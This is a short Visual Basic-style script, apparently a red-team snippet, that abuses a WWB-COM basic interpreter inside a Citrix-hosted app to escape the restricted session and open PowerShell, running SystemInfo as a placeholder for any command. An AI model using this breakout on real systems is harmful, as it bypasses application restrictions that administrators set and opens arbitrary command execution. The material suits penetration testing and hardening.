Option Explicit

Public Module Module1

    'This expands on the scenario to launch an application abusing script interpreters on presented apps.
    'For example, if a Citrix ADC hosts an app with a WWB-COM basic inerpreter, 
    'If proper GPOs/restrictions are not set this may launch PowerShell or CMD.
    'This version is adapted to open PowerShell and pass a command.
    'Start with a basic command such as SystemInfo for context, and then provide what you really want to run.  


    Sub Main
        
Shell "PowerShell.exe -NoExit -Command SystemInfo", vbNormalFocus


    End Sub
    
End Module
